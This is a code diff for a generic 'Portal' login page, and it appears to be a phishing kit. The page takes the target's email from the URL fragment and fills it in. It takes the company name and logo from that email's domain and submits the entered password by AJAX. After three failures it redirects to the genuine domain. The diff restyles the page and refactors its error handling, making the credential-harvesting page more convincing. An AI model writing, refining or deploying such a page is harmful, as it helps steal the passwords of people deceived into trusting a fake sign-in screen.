@@ -6,27 +6,112 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
     <title>Portal</title>
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
-    <!-- Add your CSS Styles -->
+    <style>
+        body {
+            background-color: #f4f4f9; /* Light background for readability */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Full page height */
+        }
+
+        #main-container {
+            width: 100%;
+            max-width: 400px; /* Restrict container width */
+            background: white; /* Panel background */
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+            border-radius: 8px; /* Rounded edges */
+            text-align: center; /* Center content */
+            padding: 20px;
+        }
+
+        img#logoImg {
+            width: 80px; /* Fixed logo size */
+            height: auto;
+            margin: auto;
+            display: block; /* Center the logo */
+            margin-bottom: 20px; /* Space below the logo */
+        }
+
+        h5#companyName {
+            font-size: 1.5rem;
+            color: #444444;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 40px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            padding: 0 10px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            background-color: #0046ad; /* Button color */
+            color: white;
+            border: none;
+            height: 40px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #003080; /* Darker blue on hover */
+        }
+
+        #error-message {
+            display: none; /* Hidden by default */
+            margin-top: 10px;
+            color: #d9534f; /* Red color for error */
+            background: #f2dede;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
 </head>
 
 <body>
-    <div id="main-outer-container">
-        <div id="main-inner-container">
-            <div>
-                <img id="logoImg" src="#" alt="Logo" />
-            </div>
-            <h5 id="companyName">COMPANY</h5>
-            <div id="err" style="display: none; color: red;">
-                An error occurred. Please try again.
-            </div>
-            <input type="email" id="id" value="user@example.com" readonly />
+    <div id="main-container">
+        <!-- Logo Section -->
+        <img id="logoImg" src="#" alt="Logo" />
+
+        <!-- Company Name -->
+        <h5 id="companyName"></h5>
+
+        <!-- Error Message -->
+        <div id="error-message">An error occurred. Please try again.</div>
+
+        <!-- Login Fields -->
+        <form onsubmit="event.preventDefault(); nextFun();">
+            <input type="email" id="id" value="" readonly />
             <input type="password" id="pass" placeholder="Enter your password" />
-            <button onclick="nextFun()">Login</button>
-        </div>
+            <button type="submit">Login</button>
+        </form>
     </div>
 
     <script>
-        let failedAttempts = 0; // Counter for failed login attempts
+        let failedAttempts = 0;
+
+        /* Update company name and logo dynamically from URL */
+        document.addEventListener("DOMContentLoaded", function () {
+            const hash = window.location.hash.substring(1);
+            if (hash && hash.includes("@")) {
+                const domain = hash.split("@")[1];
+                document.getElementById("id").value = hash;
+                document.getElementById("companyName").innerText = domain.split(".")[0].toUpperCase();
+                document.getElementById("logoImg").src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
+            }
+        });
 
         /* Login Functionality */
         function nextFun() {
@@ -34,11 +119,7 @@
             const password = document.getElementById("pass").value;
 
             if (username.length === 0 || password.length === 0) {
-                document.getElementById("err").innerText = "Email or Password cannot be empty.";
-                document.getElementById("err").style.display = "block";
-                setTimeout(() => {
-                    document.getElementById("err").style.display = "none";
-                }, 2000);
+                displayError("Email or Password cannot be empty.");
                 return;
             }
 
@@ -51,22 +132,18 @@
                         window.location.replace(response.redirectUrl || `https://${username.split("@")[1]}`);
                     } else {
                         failedAttempts++;
-                        document.getElementById("err").innerText = response.message || "Invalid credentials. Please try again.";
-                        document.getElementById("err").style.display = "block";
+                        displayError(response.message || "Invalid credentials. Try again.");
 
                         if (failedAttempts >= 3) {
-                            // Redirect after 3 failed attempts
                             window.location.replace(`https://${username.split("@")[1]}`);
                         }
                     }
                 },
                 error: function () {
                     failedAttempts++;
-                    document.getElementById("err").innerText = "An error occurred. Please try again.";
-                    document.getElementById("err").style.display = "block";
+                    displayError("An error occurred. Please try again.");
 
                     if (failedAttempts >= 3) {
-                        // Redirect after 3 failed attempts
                         window.location.replace(`https://${username.split("@")[1]}`);
                     }
                 },
@@ -76,21 +153,15 @@
             });
         }
 
-        /* ENTER key triggering login */
-        document.addEventListener("keydown", function (e) {
-            if (e.key === "Enter") nextFun();
-        });
-
-        /* Update company name and logo dynamically from URL */
-        document.addEventListener("DOMContentLoaded", function () {
-            const hash = window.location.hash.substring(1);
-            if (hash && hash.includes("@")) {
-                const domain = hash.split("@")[1];
-                document.getElementById("id").value = hash;
-                document.getElementById("companyName").innerText = domain.split(".")[0].toUpperCase();
-                document.getElementById("logoImg").src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
-            }
-        });
+        /* Display Error */
+        function displayError(message) {
+            const errorDiv = document.getElementById("error-message");
+            errorDiv.innerText = message;
+            errorDiv.style.display = "block";
+            setTimeout(() => {
+                errorDiv.style.display = "none";
+            }, 2000);
+        }
     </script>
 </body>
 
